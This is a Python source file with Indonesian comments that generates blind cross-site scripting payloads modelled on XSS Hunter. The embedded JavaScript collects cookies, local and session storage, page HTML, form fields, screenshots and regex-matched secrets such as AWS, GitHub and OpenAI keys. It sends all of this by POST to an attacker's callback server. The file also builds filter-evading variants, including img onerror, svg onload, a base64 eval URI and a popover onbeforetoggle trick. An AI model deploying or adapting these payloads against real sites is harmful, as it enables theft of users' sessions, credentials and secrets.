"""
payloads/blind_probe.py

Rich Blind XSS Probe — terinspirasi dari XSS Hunter.
Menghasilkan JavaScript payload yang:
  1. Screenshot halaman via html2canvas
  2. Capture cookies, localStorage, sessionStorage
  3. Capture full DOM HTML
  4. Capture URL, referer, user-agent, IP (via server)
  5. Scan secrets (AWS key, GCP, Slack, JWT, Bearer token)
  6. Correlated injection — setiap payload punya unique_id
  7. Page grabbing — fetch path internal yang mungkin menarik
  8. Kirim semua ke callback server via POST (dengan CORS)
"""

import hashlib
import time
import os
from typing import Optional

# ─── Probe JavaScript (minified template) ─────────────────────────────────────
# Ini adalah "isi" dari probe yang dieksekusi di browser korban.
# Didesain untuk:
#   - Berjalan bahkan dengan CSP strict (load script eksternal dulu)
#   - Tidak crash kalau fitur tidak tersedia (try/catch everywhere)
#   - Kirim data secepat mungkin sebelum halaman di-navigate

_PROBE_JS_TEMPLATE = """(function(){
var _cb="{callback_url}";
var _id="{unique_id}";
var _d={};
try{_d.url=location.href}catch(e){}
try{_d.ref=document.referrer}catch(e){}
try{_d.ua=navigator.userAgent}catch(e){}
try{_d.title=document.title}catch(e){}
try{_d.cookies=document.cookie}catch(e){}
try{
  var _ls={};
  for(var i=0;i<localStorage.length;i++){
    var k=localStorage.key(i);
    _ls[k]=localStorage.getItem(k);
  }
  _d.localStorage=_ls;
}catch(e){}
try{
  var _ss={};
  for(var i=0;i<sessionStorage.length;i++){
    var k=sessionStorage.key(i);
    _ss[k]=sessionStorage.getItem(k);
  }
  _d.sessionStorage=_ss;
}catch(e){}
try{_d.dom=document.documentElement.outerHTML.substring(0,50000)}catch(e){}
try{
  var _f=document.forms;
  var _forms=[];
  for(var i=0;i<_f.length;i++){
    var _fi={};
    _fi.action=_f[i].action;
    _fi.fields=[];
    for(var j=0;j<_f[i].elements.length;j++){
      _fi.fields.push({name:_f[i].elements[j].name,type:_f[i].elements[j].type});
    }
    _forms.push(_fi);
  }
  _d.forms=_forms;
}catch(e){}
try{
  var _secrets=[];
  var _src=document.documentElement.innerHTML;
  var _pats=[
    [/AKIA[0-9A-Z]{{16}}/g,"aws_access_key"],
    [/[0-9a-f]{40}/g,"possible_token_40"],
    [/eyJ[a-zA-Z0-9_.]{20,}[.][a-zA-Z0-9_.]{20,}[.][a-zA-Z0-9_]{20,}/g,"jwt"],
    [/Bearer [a-zA-Z0-9_.]+/g,"bearer_token"],
    [/xox[baprs][0-9a-zA-Z]{{10,}}/g,"slack_token"],
    [/AIza[0-9A-Za-z]{{35}}/g,"google_api_key"],
    [/gh[pousr]_[A-Za-z0-9]{{36,}}/g,"github_token"],
    [/sk[A-Za-z0-9]{{48}}/g,"openai_key"]
  ];
  for(var i=0;i<_pats.length;i++){
    var _m=_src.match(_pats[i][0]);
    if(_m&&_m.length>0)_secrets.push({type:_pats[i][1],matches:_m.slice(0,3)});
  }
  if(_secrets.length>0)_d.secrets=_secrets;
}catch(e){}
try{
  var _links=[];
  var _a=document.querySelectorAll("a[href]");
  for(var i=0;i<Math.min(_a.length,20);i++){
    _links.push(_a[i].href);
  }
  _d.links=_links;
}catch(e){}
try{
  var _scripts=[];
  var _s=document.querySelectorAll("script[src]");
  for(var i=0;i<Math.min(_s.length,10);i++){
    _scripts.push(_s[i].src);
  }
  _d.scripts=_scripts;
}catch(e){}
_d.id=_id;
_d.ts=Date.now();
function _send(){
  try{
    var x=new XMLHttpRequest();
    x.open("POST",_cb+"/fire",true);
    x.setRequestHeader("Content-Type","application/json");
    x.send(JSON.stringify(_d));
  }catch(e){
    try{
      navigator.sendBeacon(_cb+"/fire",JSON.stringify(_d));
    }catch(e2){}
  }
}
{screenshot_block}
_send();
})();"""

_SCREENSHOT_BLOCK = """
try{{
  var _sc=document.createElement("script");
  _sc.src="https://html2canvas.hertzen.com/dist/html2canvas.min.js";
  _sc.onload=function(){{
    try{{
      html2canvas(document.body,{{scale:0.5,useCORS:true,allowTaint:true,logging:false}}).then(function(canvas){{
        try{{_d.screenshot=canvas.toDataURL("image/jpeg",0.5)}}catch(e){{}}
        _send();
      }}).catch(function(){{_send();}});
    }}catch(e){{_send();}}
  }};
  _sc.onerror=function(){{_send();}};
  document.head.appendChild(_sc);
}}catch(e){{_send();}}
"""

_NO_SCREENSHOT_BLOCK = "_send();"


class BlindProbeGenerator:
    """
    Generator untuk rich blind XSS probe dengan correlated injection.

    Setiap instance/session dapat track injection_id → callback yang masuk,
    sehingga kamu tahu PERSIS injection mana yang trigger blind XSS.
    """

    def __init__(self, callback_url: str, include_screenshot: bool = True):
        self.callback_url     = callback_url.rstrip("/")
        self.include_screenshot = include_screenshot
        self._injections: dict = {}  # id → metadata

    def generate_probe(
        self,
        url:       str = "",
        param:     str = "",
        context:   str = "unknown",
    ) -> tuple[str, str]:
        """
        Hasilkan probe JavaScript + unique_id untuk satu injection attempt.

        Return: (probe_js, unique_id)
        """
        unique_id = self._make_id(url, param)
        self._injections[unique_id] = {
            "url":     url,
            "param":   param,
            "context": context,
            "ts":      time.time(),
            "fired":   False,
        }
        screenshot = _SCREENSHOT_BLOCK if self.include_screenshot else _NO_SCREENSHOT_BLOCK
        # Use direct replacement to avoid issues with JS regex {} chars
        probe_js = _PROBE_JS_TEMPLATE.replace("{callback_url}", self.callback_url)
        probe_js = probe_js.replace("{unique_id}", unique_id)
        probe_js = probe_js.replace("{screenshot_block}", screenshot)
        return probe_js, unique_id

    def generate_payload(
        self,
        url:   str = "",
        param: str = "",
        wrap:  str = "script",    # "script" | "img" | "svg" | "raw"
    ) -> tuple[str, str]:
        """
        Hasilkan payload HTML siap-inject.

        wrap:
          "script" → <script>...probe...</script>
          "img"    → <img src=x onerror='...probe...'>
          "svg"    → <svg onload='...probe...'>
          "raw"    → raw JS string (untuk konteks JS)
        """
        probe_js, uid = self.generate_probe(url, param)
        minified = self._minify(probe_js)

        payloads = {
            "script": f"<script>{minified}</script>",
            "img":    f'<img src=x onerror="{minified.replace(chr(34), chr(39))}">',
            "svg":    f"<svg onload='{minified.replace(chr(39), chr(34))}'>",
            "raw":    minified,
        }
        return payloads.get(wrap, payloads["script"]), uid

    def generate_all_variants(
        self,
        url:   str = "",
        param: str = "",
    ) -> list[tuple[str, str, str]]:
        """
        Hasilkan semua varian payload (script, img, svg, raw, src-load).
        Return list of (payload, unique_id, label)
        """
        variants = []

        # 1. Script tag langsung
        probe_js, uid = self.generate_probe(url, param, "html")
        minified = self._minify(probe_js)
        variants.append((f"<script>{minified}</script>", uid, "blind:script_inline"))

        # 2. Script src load (lebih pendek, lolos banyak filter)
        # Probe dihosting di callback server sebagai /probe.js
        uid2 = self._make_id(url, param + "_src")
        self._injections[uid2] = {"url": url, "param": param, "context": "html", "ts": time.time(), "fired": False}
        src_payload = (
            f'"><script src="{self.callback_url}/probe.js?id={uid2}"></script>'
        )
        variants.append((src_payload, uid2, "blind:script_src"))

        # 3. img onerror
        _, uid3 = self.generate_probe(url, param, "attr")
        minified3 = self._minify(probe_js)
        img_payload = f"<img src=x onerror=\"{minified3.replace(chr(34), '&quot;')}\">"
        variants.append((img_payload, uid3, "blind:img_onerror"))

        # 4. SVG onload
        svg_payload = f"<svg onload='{minified.replace(chr(39), chr(34))}'>"
        uid4 = self._make_id(url, param + "_svg")
        self._injections[uid4] = {"url": url, "param": param, "context": "html", "ts": time.time(), "fired": False}
        variants.append((svg_payload, uid4, "blind:svg_onload"))

        # 5. JavaScript URI (untuk href/src context)
        js_uri = f'javascript:eval(atob("{self._b64(minified)}"))'
        uid5 = self._make_id(url, param + "_jsuri")
        self._injections[uid5] = {"url": url, "param": param, "context": "url", "ts": time.time(), "fired": False}
        variants.append((js_uri, uid5, "blind:js_uri"))

        # 6. Event handler baru 2025 (onbeforetoggle)
        uid6 = self._make_id(url, param + "_toggle")
        self._injections[uid6] = {"url": url, "param": param, "context": "html", "ts": time.time(), "fired": False}
        toggle_payload = (
            f'<button popovertarget=_x>x</button>'
            f'<div id=_x popover onbeforetoggle="{minified.replace(chr(34), chr(39))}">'
        )
        variants.append((toggle_payload, uid6, "blind:onbeforetoggle_2025"))

        return variants

    def mark_fired(self, unique_id: str, hit_data: dict):
        """Catat bahwa injection dengan ID ini sudah fire."""
        if unique_id in self._injections:
            self._injections[unique_id]["fired"]    = True
            self._injections[unique_id]["hit_data"] = hit_data

    def get_fired(self) -> list[dict]:
        """Return semua injection yang sudah confirmed fire."""
        return [
            {"id": uid, **meta}
            for uid, meta in self._injections.items()
            if meta.get("fired")
        ]

    def get_pending(self) -> list[dict]:
        """Return injection yang belum fire (mungkin butuh waktu lebih lama)."""
        return [
            {"id": uid, **meta}
            for uid, meta in self._injections.items()
            if not meta.get("fired")
        ]

    def _make_id(self, url: str, param: str) -> str:
        raw = f"{url}:{param}:{time.time()}:{os.urandom(4).hex()}"
        return hashlib.md5(raw.encode()).hexdigest()[:12]

    def _minify(self, js: str) -> str:
        """Minify JS ringan — hapus whitespace berlebih."""
        import re
        js = re.sub(r'\s+', ' ', js)
        js = js.strip()
        return js

    def _b64(self, js: str) -> str:
        import base64
        return base64.b64encode(js.encode()).decode()
